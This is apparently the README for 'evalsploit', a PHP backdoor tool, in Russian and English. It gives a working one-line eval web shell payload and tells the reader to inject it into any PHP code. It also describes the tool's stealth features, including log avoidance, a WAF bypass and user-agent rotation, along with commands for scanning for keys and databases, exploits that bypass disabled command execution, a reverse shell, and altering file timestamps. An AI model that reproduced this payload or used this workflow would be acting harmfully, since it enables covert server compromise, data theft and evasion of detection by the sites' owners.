# evalsploit
Бэкдор, основанный на `eval` функции 


### Особенности

-   **Тихая работа**
    -   Работа на POST-запросах, практическая невидимая для логов
    -   Встроенная надстройка для байпаса WAF
    -   Новый юзерагент каждую новую сессию
    -   Тихий режим работы


-   **Универсальный**
    -   Пейлоад может быть встроен в любой участок заражаемого php кода
    -   Подходит для работы с серверами на OS linux, Windows, Mac

# Руководство

#### Начало работы

1) Используйте пейлоад для заражения PHP или как самостоятельный шелл:
`if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'], '' ,$_POST['Z'])));die();}`
3) При запуске программы evalsploit потребует ссылку на файл с пейлоадом
4) При изменении модуля `send` (см. "надстройка программы") используйте команду `gen` для генерации нового пейлоада

#### Работа с файловой системой

-   `ls`: список файлов в директории 
	-   Надстройка `ls`: основано на функции DirectoryIterator (стоит по умолчанию)
	-   Надстройка `dir`: основано на функции ScanDir

-   `cp`: копирование файлов
    -   Использовать разделитель ` : ` (/что.txt : /куда/что.txt)

-   `cd`: перемещение по файловой системе

-	`mkd`: создать новую директорию

-	`upl`: загрузить файл на сервер

-	`home`: вернуться в \_\_DIR\_\_

-	`pwd`: вывод активной директории

#### Работа с файлами

-   `cat`: вывод содержимого файла
    -   Надстройка `html`: основано на функции htmlentities
	-   Надстройка `base64`: основано на функции base64_encode\base64_decode (стоит по умолчанию)

-   `rm`: удаление файла

-   `dl`: загрузка файла в папку downloads
	-	Плохо работает с файлами больше 100 мб
	
-   `edit`: изменить содержимое файла
	-	Плохо работает с файлами больше 100 мб

-	`mkf`: создать новый файл

-	`touch`: изменить дату файл
	-	Использовать разделитель ` settime ` (файл.php settime Год-Месяц-День Час:Минута:Секунда)

-	`stat`: данные о файле

-	`ren`: переименовать файл
	-	Использовать разделитель ` : ` (/где/старое.txt : новое.txt)


#### Работа с системой

-   `run`: перейти  в режим командной строки
	-	`exit` для выхода из режима 
	-	Поддерживает exec, shell_exec, system, passthru, popen, proc_open, expect_popen, pcntl_exec, do
	
-	`info`: данные о сервере
	-	Версия php, OS
	
-	`scan`: сканирование выбранной директории
	-	Поиск системных PHP, баз данных, ключей и так далее
	
-	`exploit`: обход запрета командной строки встроенными эксплоитами, активирует режим командной строки
	-	`exit` для выхода из режима 

-	`reverse`: акимвация реверс-шелла - `reverse IP:PORT`
	
-	`gen`: генерация пейлоада в зависимости от модуля send
	
-	`help`: основной экран
	
-	`exit`: выход из программы
	
	
	
#### Надстройка программы

-	`set`: настройка модулей. Чтобы посмотреть список параметров использовать `set модуль help`
	-	Вместо `help` допустимы `-h`, `h`, `?`, `/?`)
	-	**run**: `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `expect_popen`, `pcntl_exec`, `do`
	-	**ls**: `ls`, `dir`
	-	**cat**: `html`, `base64`
	-	**silent**: `1`, `0` (тихий режим)
	-	**reverse**: `ivan`, `monkey` 
	-	**send**: `bypass`, `classic`, `simple` (модуль отправки)
	


# evalsploit
Backdoor based on the `eval' function


### Features

-   **Stealth**
    -   Works on POST requests, practically invisible to logs
    -   Built-in WAF bypass
    -   New user agent every new session
    -   Stealth operation setting


-   **Universal**
    -   Payload can be injected in any part of the php code
    -   Suitable for working with servers on Linux, Windows, Mac OS

# Manual

#### Getting started

1) Use the payload to infect PHP or as an independent shell:
`if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'], '' ,$_POST['Z'])));die();}`
3) When starting the program, evalsploit will require a link to the file with the payload
4) When changing the `send` module (see "program setup"), use the `gen` command to generate a new payload

#### Working with the file system

-   `ls`: list of files in the directory
	-   Setting `ls`: based on the DirectoryIterator function (stands by default)
	-   Setting `dir`: based on the ScanDir function

-   `cp`: copying files
    -   Use the separator ` : ` (/what.txt : /where/what.txt )

-   `cd`: moving through the file system

-	`mkd`: create a new directory

-	`upl`: upload a file to the server

-	`home`: back to \_\_DIR\_\_

-	`pwd`: print the active directory

#### Working with files

-   `cat`: print the file contents
    -   Setting `html`: based on the htmlentities function
	-   Setting `base64`: based on the base64_encode\base64_decode function (set as default)

-   `rm`: delete file

-   `dl`: download file (to the /download folder)
	-	Does not work well with files larger than 100 MB
	
-   `edit`: edit file contents
	-	Does not work well with files larger than 100 MB

-	`mkf`: create new file

-	`touch`: change file datestamp
	-	Use the ` set time ` separator (file.рhр settime Year-Month-Day Hour:Minute:Second)

-	`stat`: file information

-	`ren`: rename file
	-	Use the separator ` : ` (/where/old.txt : new.php )


#### Working with the evalsploit system

-   `run`: switch to command line mode
	-	`exit` to exit the mode
	-	Supports exec, shell_exec, system, passthru, popen, proc_open, expect_popen, pcntl_exec, do
	
-	`info`: server informtion
	-	php version, OS
	
-	`scan`: scanning the selected directory
	-	Search for system PHP, databases, keys etc
	
-	`exploit`: bypassing disabled command line with built-in exploits, activates the command line mode
	-	`exit` to exit the mode

-	`reverse`: reverse-shell - `reverse IP:PORT`
	
-	`gen`: generating a payload depending on the send module
	
-	`help`: home screen
	
-	`exit`: exit
	
	
	
#### Program Setup

-	`set`: configuring modules. To view the list of parameters use `set module help`
	-	Instead of `help` acceptable `-h`, `h`, `?`, `/?`)
	-	**run**: `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `expect_popen`, `pcntl_exec`, `do`
	-	**ls**: `ls`, `dir`
	-	**cat**: `html`, `base64`
	-	**silent**: `1`, `0` (Stealth)
	-	**reverse**: `ivan`, `monkey` 
	-	**send**: `bypass`, `classic`, `simple` (send mmodule)
	
